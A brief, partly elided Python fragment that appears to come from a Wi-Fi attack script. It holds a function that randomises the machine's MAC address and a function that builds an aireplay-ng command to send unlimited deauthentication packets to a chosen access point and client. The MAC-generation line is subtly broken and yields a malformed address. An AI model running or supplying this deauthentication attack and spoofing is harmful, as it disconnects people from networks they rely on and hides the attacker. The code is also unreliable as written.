...
def change_mac_address():
    ...
    new_mac = "".join(["{0:0>2X}".format(random.randint(0, 255)) if i % 3 else ":" for i in range(17)])[1:]
...
def Deauth(interface, bssid, client_mac):
    command = "aireplay-ng --deauth 0 -a {0} -c {1} {2}".format(bssid, client_mac, interface)
